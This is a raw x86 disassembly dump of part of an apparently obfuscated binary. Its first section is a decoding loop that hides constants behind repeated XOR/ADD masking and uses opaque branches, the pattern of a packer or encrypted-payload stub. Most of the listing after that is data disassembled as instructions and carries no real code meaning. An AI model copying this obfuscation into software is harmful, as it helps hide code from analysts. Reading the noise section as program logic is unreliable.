  418a0d:	xor    eax,0x75108b5
  418a12:	add    eax,0x3272fb
  418a17:	cmp    DWORD PTR [ebp-0xfc],eax
  418a1d:	jae    0x418aa4
  418a23:	mov    eax,DWORD PTR [ebp-0xfc]
  418a29:	sub    eax,0x3272fb
  418a2e:	xor    eax,0x75108b5
  418a33:	add    eax,0x7f55d8f2
  418a38:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a3e:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a45:	mov    eax,DWORD PTR [ebp-0xfc]
  418a4b:	cmp    DWORD PTR [ebp+eax*4-0xf4],0x244ecb9d
  418a56:	jbe    0x418a80
  418a5c:	mov    eax,DWORD PTR [ebp-0xfc]
  418a62:	mov    eax,DWORD PTR [ebp+eax*4-0xf4]
  418a69:	add    eax,0x405fcdc
  418a6e:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a74:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a7b:	jmp    0x418a9f
  418a80:	mov    eax,DWORD PTR [ebp-0xfc]
  418a86:	mov    eax,DWORD PTR [ebp+eax*4-0xf4]
  418a8d:	sub    eax,0x250bcdc
  418a92:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a98:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a9f:	jmp    0x4189fa
  418aa4:	xor    eax,eax
  418aa6:	inc    eax
  418aa7:	jne    0x418ac7
  418aad:	movzx  eax,BYTE PTR [ebp-0xf5]
  418ab4:	xor    eax,0x83
  418ab9:	add    eax,0x8
  418abc:	mov    BYTE PTR [ebp-0xf5],al
  418ac2:	jmp    0x418b06
  418ac7:	mov    eax,DWORD PTR [ebp-0xd4]
  418acd:	xor    eax,0x75108b5
  418ad2:	add    eax,0x3272fb
  418ad7:	movzx  ecx,BYTE PTR [ebp-0xf5]
  418ade:	sub    ecx,eax
  418ae0:	mov    BYTE PTR [ebp-0xf5],cl
  418ae6:	mov    ecx,DWORD PTR [ebp-0xcc]
  418aec:	xor    ecx,0x75108b5
  418af2:	add    ecx,0x3272fb
  418af8:	mov    al,BYTE PTR [ebp-0xf5]
  418afe:	ror    al,cl
  418b00:	mov    BYTE PTR [ebp-0xf5],al
  418b06:	xor    eax,eax
  418b08:	mov    eax,DWORD PTR [ebp-0x8]
  418b0b:	add    eax,DWORD PTR [ebp-0xd0]
  418b11:	mov    cl,BYTE PTR [ebp-0xf5]
  418b17:	mov    BYTE PTR [eax],cl
  418b19:	mov    eax,DWORD PTR [ebp-0xd0]
  418b1f:	sub    eax,0x3272fb
  418b24:	xor    eax,0x75108b5
  418b29:	cmp    eax,DWORD PTR [ebp-0xdc]
  418b2f:	jne    0x418b8c
  418b35:	mov    eax,DWORD PTR [ebp-0xc8]
  418b3b:	xor    eax,0x75108b5
  418b40:	add    eax,0x3272fb
  418b45:	mov    ecx,DWORD PTR [ebp-0xe0]
  418b4b:	xor    ecx,0x75108b5
  418b51:	add    ecx,0x3272fb
  418b57:	sub    eax,ecx
  418b59:	sub    eax,0x3272fb
  418b5e:	xor    eax,0x75108b5
  418b63:	mov    DWORD PTR [ebp-0xc8],eax
  418b69:	mov    eax,DWORD PTR [ebp-0xe0]
  418b6f:	xor    eax,0x75108b5
  418b74:	add    eax,0x3272fb
  418b79:	mov    ecx,DWORD PTR [ebp-0x100]
  418b7f:	sub    ecx,eax
  418b81:	mov    DWORD PTR [ebp-0xd0],ecx
  418b87:	jmp    0x418baa
  418b8c:	mov    eax,DWORD PTR [ebp-0xe0]
  418b92:	xor    eax,0x75108b5
  418b97:	add    eax,0x3272fb
  418b9c:	mov    ecx,DWORD PTR [ebp-0xd0]
  418ba2:	sub    ecx,eax
  418ba4:	mov    DWORD PTR [ebp-0xd0],ecx
  418baa:	jmp    0x416531
  418baf:	mov    DWORD PTR [ebp-0x7c],0xe
  418bb6:	jmp    0x418bc2
  418bbb:	mov    eax,DWORD PTR [ebp-0x7c]
  418bbe:	dec    eax
  418bbf:	mov    DWORD PTR [ebp-0x7c],eax
  418bc2:	cmp    DWORD PTR [ebp-0x7c],0x0
  418bc6:	jbe    0x42b043
  418bcc:	mov    eax,DWORD PTR [ebp-0x7c]
  418bcf:	dec    eax
  418bd0:	xor    edx,edx
  418bd2:	push   0x2
  418bd4:	pop    ecx
  418bd5:	div    ecx
  418bd7:	mov    DWORD PTR [ebp-0x140],edx
  418bdd:	mov    eax,DWORD PTR [ebp-0x2c]
  418be0:	mov    DWORD PTR [ebp-0x13c],eax
  418be6:	mov    DWORD PTR [ebp-0x110],0xf89c8527
  418bf0:	mov    DWORD PTR [ebp-0x108],0xf89c85bd
  418bfa:	mov    DWORD PTR [ebp-0x118],0xf89c85b0
  418c04:	mov    DWORD PTR [ebp-0x11c],0xf89c85b3
  418c0e:	mov    DWORD PTR [ebp-0x104],0xf89c85b2
  418c18:	mov    eax,DWORD PTR [ebp-0x11c]
  418c1e:	xor    eax,0x75108b5
  418c23:	jmp    0x41afc9
  418c28:	adc    BYTE PTR [eax],0xb6
  418c2b:	push   ebp
  418c2c:	xor    al,0x75
  418c2e:	pusha  
  418c2f:	push   esp
  418c30:	dec    edx
  418c31:	repz jae 0x418c1c
  418c34:	add    edi,DWORD PTR [eax+ebp*4+0x7ab639b1]
  418c3b:	jnp    0x418c3f
  418c3d:	cwde   
  418c3e:	jnp    0x418cbb
  418c40:	ret    
  418c41:	in     eax,dx
  418c42:	ret    
  418c43:	loop   0x418bf8
  418c45:	test   esp,0xd5cbb8b5
  418c4b:	repnz aam 0xf4
  418c4e:	out    dx,eax
  418c4f:	out    dx,eax
  418c50:	rcl    esi,0xd8
  418c53:	add    al,bh
  418c55:	repnz aam 0x1
  418c58:	test   BYTE PTR [ecx],0xa
  418c5b:	add    bl,bh
  418c5d:	shr    esp,cl
  418c5f:	fucomip st,st(0)
  418c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c62:	in     al,dx
  418c63:	loope  0x418c4e
  418c65:	retf   0xc8cb
  418c68:	stc    
  418c69:	fistp  QWORD PTR [edx-0x4822fd47]
  418c6f:	(bad)  
  418c70:	mov    ecx,0xd2dad1ed
  418c75:	(bad)  
  418c76:	loopne 0x418c70
  418c78:	mov    BYTE PTR [ebx],0x7
  418c7b:	dec    BYTE PTR [eax]
  418c7d:	adc    ebx,esi
  418c7f:	mov    al,0xa5
  418c81:	in     al,dx
  418c82:	shl    dh,cl
  418c84:	retf   0xc9ed
  418c87:	mov    dl,0xc6
  418c89:	(bad)  
  418c8b:	fidivr WORD PTR [eax-0x4a040305]
  418c91:	rcl    esi,cl
  418c93:	loop   0x418c95
  418c95:	fucom  st(5)
  418c97:	(bad)  
  418c98:	hlt    
  418c99:	(bad)  
  418c9b:	out    0xcd,al
  418c9d:	adc    edi,DWORD PTR [ebp+ebp*8-0x4b3e3030]
  418ca4:	mov    ch,0xcf
  418ca6:	cmc    
  418ca7:	mul    ebp
  418ca9:	(bad)  
  418cab:	fcmovnu st,st(4)
  418cad:	loop   0x418caa
  418caf:	fdivr  QWORD PTR [esi-0xafc2b2c]
  418cb5:	xlat   BYTE PTR ds:[ebx]
  418cb6:	fucomip st,st(7)
  418cb8:	add    ah,al
  418cba:	syscall 
  418cbc:	iret   
  418cbd:	icebp  
  418cbe:	mov    bl,0xbf
  418cc0:	loope  0x418cb9
  418cc2:	rcr    ebx,0xb0
  418cc5:	int3   
  418cc6:	out    0xc6,eax
  418cc8:	in     al,0xc8
  418cca:	in     eax,dx
  418ccb:	enter  0xface,0xfd
  418ccf:	repnz ffree st(1)
  418cd2:	lock mov esp,0xc6e307e0
  418cd8:	add    al,0xda
  418cda:	out    0xc5,eax
  418cdc:	jmp    0x418cbb
  418cde:	repnz jecxz 0x418cab
  418ce1:	iret   
  418ce2:	(bad)
  418ce5:	in     al,dx
  418ce6:	sar    ebx,1
  418ce8:	retf   0xeff1
  418ceb:	mov    edi,0xccccefca
  418cf0:	sti    
  418cf1:	rol    DWORD PTR [ecx],cl
  418cf3:	stc    
  418cf4:	mov    esp,0xe502c70a
  418cf9:	psraw  mm1,QWORD PTR [ebx+ecx*8]
  418cfd:	in     al,0xd2
  418cff:	jmp    0xb5076fd3
  418d04:	test   ch,0xf1
  418d07:	repz les edi,FWORD PTR [esi-0x17082846]
  418d0e:	add    bl,ah
  418d10:	rcl    esi,1
  418d12:	(bad)  
  418d14:	fstp   st(4)
  418d16:	mov    edi,0xe1ea0709
  418d1b:	ret    0xda02
  418d1e:	(bad)  
  418d20:	in     al,dx
  418d21:	fisubr WORD PTR [ebp+esi*8-0x152e3f3e]
  418d28:	in     eax,0xdb
  418d2a:	mov    ah,0xbe
  418d2c:	cli    
  418d2d:	icebp  
  418d2e:	repz add dl,bl
  418d31:	fnstcw WORD PTR [ebp-0xa0424fc]
  418d37:	fdivr  st,st(3)
  418d39:	add    ah,ch
  418d3b:	push   es
  418d3c:	fprem  
  418d3e:	into   
  418d3f:	repz mov edi,0xefcac7be
  418d45:	mov    edx,0xd5f6d4e8
  418d4a:	mov    ch,0xe8
  418d4c:	mov    ebp,0xd8f5fabe
  418d51:	in     eax,dx
  418d52:	vpavgb xmm3,xmm4,xmm1
  418d56:	cmc    
  418d57:	jmp    0xfd407956
  418d5c:	pop    es
  418d5d:	int3   
  418d5e:	leave  
  418d5f:	ror    bh,cl
  418d61:	mov    bl,0xdc
  418d63:	loopne 0x418d51
  418d65:	into   
  418d66:	icebp  
  418d67:	(bad)  
  418d68:	sar    al,1
  418d6a:	(bad)  
  418d6c:	mov    eax,0xd9befae8
  418d71:	rcr    esi,cl
  418d73:	loopne 0x418d71
  418d75:	mov    ebp,0xc9eae7d6
  418d7b:	in     eax,dx
  418d7c:	in     al,0xee
  418d7e:	in     al,dx
  418d7f:	retf   
  418d80:	loope  0x418d45
  418d82:	mov    dh,0xcc
  418d84:	mov    bl,0xd0
  418d86:	iret   
  418d87:	int3   
  418d88:	into   
  418d89:	out    0xb9,al
  418d8b:	add    eax,ebx
  418d8d:	fdivr  QWORD PTR [esi-0x322633fe]
  418d93:	test   ebx,0xddfdf6d2
  418d99:	push   es
  418d9a:	add    al,0xda
  418d9c:	jmp    0xe63240a6
  418da1:	lock shr esp,1
  418da4:	(bad)  
  418da5:	retf   0xe6f8
  418da8:	lods   eax,DWORD PTR ds:[esi]
  418da9:	repnz mov edx,0xdbb0f2d2
  418daf:	call   0xff494e6d
  418db4:	or     al,BYTE PTR [edi+esi*8]
  418db7:	in     al,0xc1
  418db9:	retf   
  418dba:	out    0xfb,eax
  418dbc:	into   
  418dbd:	(bad)  
  418dbe:	les    edi,FWORD PTR [edi-0x114c2f38]
  418dc4:	in     eax,0xb6
  418dc6:	(bad)  
  418dc7:	fucomi st,st(0)
  418dc9:	mov    al,0xfa
  418dcb:	mov    dl,0xdb
  418dcd:	icebp  
  418dce:	aad    0xfa
  418dd0:	(bad)  
  418dd1:	fld    st(0)
  418dd3:	rcl    dl,1
  418dd5:	(bad)  
  418dd7:	(bad)
  418dda:	enter  0xada,0xe7
  418dde:	test   al,0xb1
  418de0:	ret    
  418de1:	mov    esp,0xbae2cbb2
  418de6:	fcmovu st,st(0)
  418de8:	in     eax,dx
  418de9:	mov    ebx,0xded9edeb
  418dee:	(bad)  
  418def:	mov    ecx,0xf2e4f6d6
  418df4:	loopne 0x418ded
  418df6:	rol    DWORD PTR [ebx],1
  418df8:	not    ebp
  418dfa:	(bad)
  418dfd:	or     bl,dl
  418dff:	mov    cl,0xcd
  418e01:	into   
  418e02:	shl    BYTE PTR [ebp-0x203f0b54],cl
  418e08:	les    esi,FWORD PTR [eax-0x5410d38]
  418e0e:	mov    bh,0xdd
  418e10:	rcr    dh,0xed
  418e13:	in     al,dx
  418e14:	rcr    dh,0xc1
  418e17:	aam    0xe1
  418e19:	add    bl,cl
  418e1b:	out    dx,eax
  418e1c:	in     eax,dx
  418e1d:	icebp  
  418e1e:	stos   BYTE PTR es:[edi],al
  418e1f:	icebp  
  418e20:	test   eax,0xdaf0d3dc
  418e25:	mov    ebx,0xd4dfb4e6
  418e2a:	in     eax,0xfd
  418e2c:	rcr    esi,1
  418e2e:	rcr    edx,0xe6
  418e31:	(bad)  
  418e33:	add    BYTE PTR ds:0xee0209d2,al
  418e39:	in     al,0x1
  418e3b:	call   0xbdf1573d
  418e40:	mov    al,0xcb
  418e42:	xlat   BYTE PTR ds:[ebx]
  418e43:	shl    ecx,cl
  418e45:	out    dx,eax
  418e46:	lock leave 
  418e48:	mov    dh,0xe9
  418e4a:	int    0xd0
  418e4c:	(bad)  
  418e4e:	(bad)  
  418e50:	int3   
  418e51:	(bad)  
  418e52:	test   edx,0xe2c3e6c3
  418e58:	std    
  418e59:	jmp    0xe41a8b48
  418e5e:	loopne 0x418e4c
  418e60:	lock imul DWORD PTR [edi-0x2f28164a]
  418e67:	in     eax,dx
  418e68:	(bad)
  418e6b:	sar    DWORD PTR [ebp-0x18421f26],1
  418e71:	not    esi
  418e73:	hlt    
  418e74:	pop    es
  418e75:	hlt    
  418e76:	std    
  418e77:	cmc    
  418e78:	or     edi,DWORD PTR [edi+ebx*8-0x47030027]
  418e7f:	loop   0x418e50
  418e81:	fsubp  st(0),st
  418e83:	mov    esp,0xc4e0f5e8
  418e88:	jmp    0x418e54
  418e8a:	(bad)  
  418e8b:	(bad)  
  418e8d:	mov    ebx,0xfbfdc0bd
  418e92:	fdiv   st,st(1)
  418e94:	rcl    bh,1
  418e96:	add    DWORD PTR [ebx],ecx
  418e98:	test   BYTE PTR [edi],0xe6
  418e9b:	leave  
  418e9c:	in     eax,0xd
  418e9e:	retf   0xe2cf
  418ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ea2:	into   
  418ea3:	int    0xf0
  418ea5:	fcmovbe st,st(1)
  418ea7:	cmc    
  418ea8:	cli    
  418ea9:	lods   al,BYTE PTR ds:[esi]
  418eaa:	in     eax,0xbb
  418eac:	fdivr  st(1),st
  418eae:	fst    st(5)
  418eb0:	sar    BYTE PTR [eax-0x3d25fe],1
  418eb6:	push   es
  418eb7:	test   cl,0xbc
  418eba:	call   0xa82e8baa
  418ebf:	(bad)  
  418ec1:	mov    al,0xad
  418ec3:	in     al,dx
  418ec4:	ror    al,0xc9
  418ec7:	ror    esp,1
  418ec9:	retf   0xfaec
  418ecc:	jmp    0xd6165fa0
  418ed1:	stc    
  418ed2:	std    
  418ed3:	rol    BYTE PTR [eax+edx*8],1
  418ed6:	retf   0xe2c9
  418ed9:	push   es
  418eda:	fadd   st,st(4)
  418edc:	int3   
  418edd:	enter  0xf1bf,0xc2
  418ee1:	out    dx,al
  418ee2:	retf   
  418ee3:	mov    dh,0xe8
  418ee5:	repnz int3 
  418ee7:	lock clc 
  418ee9:	clc    
  418eea:	stc    
  418eeb:	fcomp  st(2)
  418eed:	retf   0xe1be
  418ef0:	ret    0xd0f0
  418ef3:	add    ebx,edx
  418ef5:	mov    BYTE PTR [edi+esi*8],0xc1
  418ef9:	in     al,0xd8
  418efb:	add    eax,0xf1cadccc
  418f00:	mov    al,0xb0
  418f02:	retf   
  418f03:	in     eax,0xe2
  418f05:	mov    ebx,0xcbeab1b5
  418f0a:	enter  0xeee4,0xd0
  418f0e:	loopne 0x418f13
  418f10:	add    ah,dh
  418f12:	add    al,0xd5
  418f14:	loop   0x418ef2
  418f16:	aad    0x7
  418f18:	fsub   st(1),st
  418f1a:	hlt    
  418f1b:	or     al,cl
  418f1d:	fdivr  st(2),st
  418f1f:	lods   al,BYTE PTR ds:[esi]
  418f20:	jmp    0xd5143f16
  418f25:	rol    al,1
  418f27:	retf   0xc9e6
  418f2a:	mov    bl,0xea
  418f2c:	sar    ebx,cl
  418f2e:	(bad)  
  418f2f:	sti    
  418f30:	mov    esi,0xded7f705
  418f35:	aam    0xe9
  418f37:	fstp   st(7)
  418f39:	jecxz  0x418f3e
  418f3b:	out    dx,al
  418f3c:	(bad)  
  418f3e:	mov    dl,0xc3
  418f40:	shl    BYTE PTR [ecx-0x571e1644],1
  418f46:	out    0xc0,al
  418f48:	xlat   BYTE PTR ds:[ebx]
  418f49:	shl    esi,cl
  418f4b:	jmp    0x418f05
  418f4d:	mov    edi,0xf8f1b8db
  418f52:	(bad)  
  418f54:	pop    es
  418f55:	ret    0xf9c4
  418f58:	vpmaddwd ymm5,ymm2,ymm4
  418f5c:	or     eax,0xa5aad0e6
  418f61:	xlat   BYTE PTR ds:[ebx]
  418f62:	ret    0xd5b4
  418f65:	fldz   
  418f67:	mov    cl,0xd8
  418f69:	mov    ch,0xe8
  418f6b:	mov    dh,0xd5
  418f6d:	div    bh
  418f6f:	(bad)  
  418f71:	rcl    esi,0xd0
  418f74:	or     bh,ch
  418f76:	or     ecx,ebx
  418f78:	add    esi,ebp
  418f7a:	push   cs
  418f7b:	in     eax,dx
  418f7c:	jecxz  0x418f63
  418f7e:	retf   0xb7c8
  418f81:	ret    0xd6d2
  418f84:	int3   
  418f85:	out    dx,al
  418f86:	mov    bh,0xe6
  418f88:	xlat   BYTE PTR ds:[ebx]
  418f89:	out    0xb5,al
  418f8b:	out    dx,al
  418f8c:	retf   
  418f8d:	repnz rol DWORD PTR [eax],0xdc
  418f91:	fcmovne st,st(4)
  418f93:	mov    ebp,0xf8e8e1f6
  418f98:	add    dl,bl
  418f9a:	in     al,0xe3
  418f9c:	cld    
  418f9d:	dec    dh
  418f9f:	shl    dl,cl
  418fa1:	mov    ebp,0xd0b0dccb
  418fa6:	fucompp 
  418fa8:	(bad)  
  418fa9:	mov    edi,0xfef3cdcf
  418fae:	ret    
  418faf:	fdivr  st,st(5)
  418fb1:	rcr    eax,1
  418fb3:	push   es
  418fb4:	xabort 0xf9
  418fb7:	enter  0xcf0f,0xfb
  418fbb:	loopne 0x418fb5
  418fbd:	fsubp  st(7),st
  418fbf:	mov    cl,0xb0
  418fc1:	vshufps ymm5,ymm5,YMMWORD PTR [ecx-0x124f4454],0xdf
  418fca:	fdivr  st(7),st
  418fcc:	icebp  
  418fcd:	mov    eax,0xf3dbb9b8
  418fd2:	add    eax,DWORD PTR [eax]
  418fd4:	rol    ecx,1
  418fd6:	retf   0xdee9
  418fd9:	add    esi,eax
  418fdb:	pop    es
  418fdc:	jmp    0x418fd7
  418fde:	loope  0x418f98
  418fe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fe1:	into   
  418fe2:	out    dx,al
  418fe3:	mov    ch,0xee
  418fe5:	int    0xef
  418fe7:	enter  0xd7f1,0xd0
  418feb:	in     al,dx
  418fec:	(bad)  
  418fee:	std    
  418fef:	ret    
  418ff0:	mov    esi,0xac6bff4
  418ff5:	(bad)  
  418ff6:	(bad)  
  418ff8:	add    dh,ch
  418ffa:	hlt    
  418ffb:	fadd   DWORD PTR [edx]
  418ffd:	(bad)  
  418ffe:	fucomp st(4)
  419000:	in     al,dx
  419001:	into   
  419002:	int    0xcb
  419004:	aad    0xce
  419006:	jmp    0xbf1785bf
  41900b:	jmp    0xdb414907
  419010:	fcmovnbe st,st(6)
  419012:	fnclex 
  419014:	retf   
  419015:	sar    dl,0x0
  419018:	cmc    
  419019:	pop    es
  41901a:	in     eax,dx
  41901b:	dec    DWORD PTR [edi]
  41901d:	loopne 0x419005
  41901f:	loop   0x418ff2
  419021:	jecxz  0x418fd6
  419023:	(bad)  
  419025:	in     eax,dx
  419026:	xlat   BYTE PTR ds:[ebx]
  419027:	mov    dl,0xf7
  419029:	int    0xb9
  41902b:	sar    DWORD PTR [edx-0x383f2a24],1
  419031:	cmc    
  419032:	ror    BYTE PTR [ebx],cl
  419034:	or     al,ch
  419036:	add    eax,0xecfbc902
  41903b:	loope  0x41901a
  41903d:	jecxz  0x419009
  41903f:	ror    esi,1
  419041:	jmp    0x41900e
  419043:	mov    dl,0xb5
  419045:	lds    esi,FWORD PTR [ebp-0x92b0a0d]
  41904b:	(bad)  
  41904d:	jmp    0xfe118448
  419052:	clc    
  419053:	fucomp st(3)
  419055:	retf   
  419056:	vpsubq ymm1,ymm4,YMMWORD PTR [edx]
  41905a:	aam    0xe9
  41905c:	stc    
  41905d:	push   cs
  41905e:	loopne 0x419047
  419060:	mov    esp,0xd5f1afdc
  419065:	cmc    
  419066:	mov    bl,0xcf
  419068:	(bad)  
  419069:	imul   eax
  41906b:	mov    eax,0xd0ded0ce
  419070:	cli    
  419071:	into   
  419072:	out    0xf0,eax
  419074:	fadd   QWORD PTR ds:0xfa09eae2
  41907a:	or     ah,cl
  41907c:	jmp    0xb0ec:0xc2afafd3
  419083:	icebp  
  419084:	(bad)  
  419085:	loopne 0x419037
  419087:	in     al,0xef
  419089:	out    dx,al
  41908a:	rcl    esi,cl
  41908c:	fdiv   DWORD PTR [eax+ecx*8-0xb47272b]
  419093:	fprem  
  419095:	in     eax,0xc7
  419097:	mov    esi,0xf8f5f4f7
  41909c:	in     eax,0x6
  41909e:	retf   0xadb8
  4190a1:	scas   eax,DWORD PTR es:[edi]
  4190a2:	call   0xf1ea3e6e
  4190a7:	in     eax,0xd0
  4190a9:	fidiv  WORD PTR [ebp-0x27461626]
  4190af:	mov    ebp,0xf2d2f2cd
  4190b4:	loop   0x4190c1
  4190b6:	ret    0xd8cb
  4190b9:	leave  
  4190ba:	jmp    0xb33178a4
  4190bf:	out    0xad,eax
  4190c1:	rep stos DWORD PTR es:[edi],eax
  4190c3:	repz shl DWORD PTR [esi-0x5094734],1
  4190ca:	(bad)  
  4190cb:	int    0xca
  4190cd:	(bad)  
  4190cf:	mov    esi,0xf904d2db
  4190d4:	repnz cli 
  4190d6:	std    
  4190d7:	fdivr  st,st(0)
  4190d9:	fild   WORD PTR ds:0xc8edccca
  4190df:	test   al,0xac
  4190e1:	mov    ebp,0xe7e8b2d1
  4190e6:	(bad)  
  4190e7:	fucomip st,st(5)
  4190e9:	fdivr  DWORD PTR [esi-0x2f111115]
  4190ef:	cli    
  4190f0:	fdivr  st(1),st
  4190f2:	(bad)  
  4190f3:	icebp  
  4190f4:	xlat   BYTE PTR ds:[ebx]
  4190f5:	aam    0xf8
  4190f7:	in     al,0xfe
  4190f9:	clc    
  4190fa:	iret   
  4190fb:	out    dx,eax
  4190fc:	lds    eax,FWORD PTR [edi]
  4190fe:	loop   0x4190d8
  419100:	(bad)  
  419101:	mov    bl,0xb2
  419103:	loope  0x4190ae
  419105:	out    dx,al
  419106:	shl    cl,cl
  419108:	out    dx,al
  419109:	retf   
  41910a:	fnstsw WORD PTR [esp+esi*8-0x3101010f]
  419111:	inc    BYTE PTR ds:0xfcfae60b
  419117:	out    0xb,eax
  419119:	(bad)  
  41911a:	loope  0x4190fe
  41911c:	retf   
  41911d:	pop    es
  41911e:	repnz mov ebp,0xe5afc5ad
  419124:	lods   al,BYTE PTR ds:[esi]
  419125:	(bad)  
  419126:	retf   0xc8ea
  419129:	in     al,0xdb
  41912b:	aad    0xfb
  41912d:	fcmovnbe st,st(7)
  41912f:	fnstsw ax
  419131:	ffree  st(6)
  419133:	jecxz  0x41912e
  419135:	add    eax,0xebe70bfa
  41913a:	call   0xc5345613
  41913f:	loopne 0x4190fe
  419141:	in     eax,dx
  419142:	loopne 0x419104
  419144:	div    eax
  419146:	shl    ah,1
  419148:	in     al,0xb6
  41914a:	sti    
  41914b:	out    dx,al
  41914c:	jecxz  0x41912c
  41914e:	mov    esi,0xf6f4c7d4
  419153:	stc    
  419154:	mov    esp,0xf405f9e5
  419159:	or     edi,edi
  41915b:	(bad)  
  41915c:	in     eax,dx
  41915d:	fild   QWORD PTR [eax-0x1d1c4122]
  419163:	imul   bl
  419165:	call   0xec0d8d57
  41916a:	(bad)
  41916d:	jecxz  0x41916b
  41916f:	std    
  419170:	rcr    ebp,0xec
  419173:	fxch   st(3)
  419175:	add    edx,ecx
  419177:	xlat   BYTE PTR ds:[ebx]
  419178:	jmp    0x419179
  41917a:	cld    
  41917b:	leave  
  41917c:	int3   
  41917d:	les    edi,FWORD PTR [ecx+eax*8-0x374d4d53]
  419184:	out    0xc6,al
  419186:	mov    cl,0xe6
  419188:	fsubrp st(4),st
  41918a:	lock mov edx,0xc8d8d7cb
  419190:	fcmovbe st,st(5)
  419192:	repnz (bad) 
  419195:	ret    0x4d6
  419198:	jmp    0xaae6:0xdee3e4f4
  41919f:	out    0xed,al
  4191a1:	mov    esi,0xdbadefe9
  4191a6:	(bad)  
  4191a7:	mov    eax,0xebb6d5de
  4191ac:	icebp  
  4191ad:	loope  0x419197
  4191af:	loope  0x4191b2
  4191b1:	mov    esp,0xe7dafdcc
  4191b6:	fsub   st(0),st
  4191b8:	or     BYTE PTR [esi],al
  4191ba:	(bad)  
  4191bb:	in     eax,dx
  4191bc:	rcr    edi,0xbd
  4191bf:	retf   0xbde2
  4191c2:	neg    bl
  4191c4:	mov    bh,0xe1
  4191c6:	mul    dh
  4191c8:	imul   ecx
  4191ca:	mov    bl,0xef
  4191cc:	mov    cl,0xdc
  4191ce:	cmc    
  4191cf:	mov    edi,0xdfdcd402
  4191d4:	jmp    esi
  4191d6:	jecxz  0x4191b7
  4191d8:	push   esi
  4191da:	push   cs
  4191db:	add    eax,0xcfaef909
  4191e0:	repz in eax,dx
  4191e2:	in     eax,dx
  4191e3:	out    dx,al
  4191e4:	loopne 0x4191ac
  4191e6:	icebp  
  4191e7:	mov    ch,0xe5
  4191e9:	jmp    0xe42a6ecd
  4191ee:	fild   DWORD PTR [edi]
  4191f0:	fsubr  st,st(4)
  4191f2:	in     eax,dx
  4191f3:	aad    0xc0
  4191f5:	in     eax,0xe4
  4191f7:	loop   0x4191ee
  4191f9:	or     dl,bl
  4191fb:	cli    
  4191fc:	out    dx,al
  4191fd:	(bad)  [esi-0x2f0e2137]
  419203:	shl    edx,1
  419205:	in     al,dx
  419206:	mov    ebx,0xc8edb6df
  41920b:	mov    esp,0xdce8ecce
  419210:	lock add al,bl
  419213:	aam    0x0
  419215:	aam    0x6
  419217:	mov    esi,0xe80706dd
  41921c:	cld    
  41921d:	std    
  41921e:	scas   al,BYTE PTR es:[edi]
  41921f:	fdivr  QWORD PTR [esi-0x532a0a1d]
  419225:	aam    0xd9
  419227:	clc    
  419228:	in     eax,0xac
  41922a:	mov    ch,0xf3
  41922c:	mov    eax,0xbebccecd
  419231:	xlat   BYTE PTR ds:[ebx]
  419232:	jecxz  0x41922b
  419234:	jecxz  0x419201
  419236:	fsubrp st(0),st
  419238:	lds    eax,FWORD PTR ds:0x120ec5dd
  41923e:	repnz xlat BYTE PTR ds:[ebx]
  419240:	(bad)  
  419241:	jmp    0xd0f6470a
  419246:	lock icebp 
  419248:	mul    dh
  41924a:	retf   0xeeef
  41924d:	ror    bh,cl
  41924f:	fcomi  st,st(7)
  419251:	ret    0xd4fb
  419254:	out    0xc7,eax
  419256:	fsubr  st,st(2)
  419258:	in     al,0xe9
  41925a:	fdivr  st,st(6)
  41925c:	or     bh,ch
  41925e:	shr    esi,0xe3
  419261:	ror    dh,1
  419263:	iret   
  419264:	mov    al,0xe5
  419266:	mov    dl,0xc5
  419268:	ror    eax,cl
  41926a:	int    0xea
  41926c:	enter  0x3c3,0xc3
  419270:	out    0xf0,eax
  419272:	neg    ah
  419274:	stc    
  419275:	pop    es
  419276:	in     eax,0xfe
  419278:	jmp    0xece3:0x1d8dd0b
  41927f:	ret    0xb2f0
  419282:	loopne 0x419269
  419284:	jecxz  0x419260
  419286:	iret   
  419287:	aad    0xbb
  419289:	(bad)  
  41928b:	iret   
  41928c:	retf   0xfef2
  41928f:	aad    0x3
  419291:	hlt    
  419292:	mov    DWORD PTR [eax],0x9fbf6b9
  419298:	out    0xcb,al
  41929a:	sti    
  41929b:	aam    0xc9
  41929d:	adc    esp,eax
  41929f:	into   
  4192a0:	xlat   BYTE PTR ds:[ebx]
  4192a1:	iret   
  4192a2:	shl    BYTE PTR [esi+eiz*8-0x1807254b],1
  4192a9:	repnz cld 
  4192ab:	cli    
  4192ac:	hlt    
  4192ad:	shr    esp,cl
  4192af:	into   
  4192b0:	in     eax,dx
  4192b1:	hlt    
  4192b2:	aad    0xc5
  4192b4:	pop    es
  4192b5:	jmp    0x4192a0
  4192b7:	push   es
  4192b8:	xlat   BYTE PTR ds:[ebx]
  4192b9:	iret   
  4192ba:	add    eax,DWORD PTR [ebx]
  4192bc:	int3   
  4192bd:	retf   0xc5aa
  4192c0:	mov    al,0xad
  4192c2:	out    0xaa,al
  4192c4:	icebp  
  4192c5:	hlt    
  4192c6:	enter  0xdef3,0xf3
  4192ca:	(bad)  
  4192cc:	rcr    esi,cl
  4192ce:	out    dx,eax
  4192cf:	(bad)  
  4192d1:	icebp  
  4192d2:	lock (bad) 
  4192d4:	(bad)  
  4192d5:	not    ch
  4192d7:	neg    esp
  4192d9:	hlt    
  4192da:	(bad)  
  4192db:	in     eax,dx
  4192dc:	adc    cl,al
  4192de:	shr    ebx,cl
  4192e0:	in     al,0xaf
  4192e2:	in     al,0xae
  4192e4:	aam    0xac
  4192e6:	cmc    
  4192e7:	fbstp  TBYTE PTR [ebp-0x14214b33]
  4192ed:	rol    cl,1
  4192ef:	hlt    
  4192f0:	fstp   st(1)
  4192f2:	in     eax,0xc0
  4192f4:	(bad)  
  4192f5:	(bad)  
  4192f6:	pop    es
  4192f7:	or     ch,al
  4192f9:	(bad)  
  4192fa:	in     eax,dx
  4192fb:	in     al,dx
  4192fc:	fimul  DWORD PTR [esi]
  4192fe:	rol    esp,cl
  419300:	loopne 0x4192c7
  419302:	stos   DWORD PTR es:[edi],eax
  419303:	mov    dh,0xf5
  419305:	int3   
  419306:	mov    ch,0xf5
  419308:	lock leave 
  41930a:	sti    
  41930b:	call   0xbe1b6aee
  419310:	shl    ecx,cl
  419312:	sar    DWORD PTR [esi+0x4c5dbd0],cl
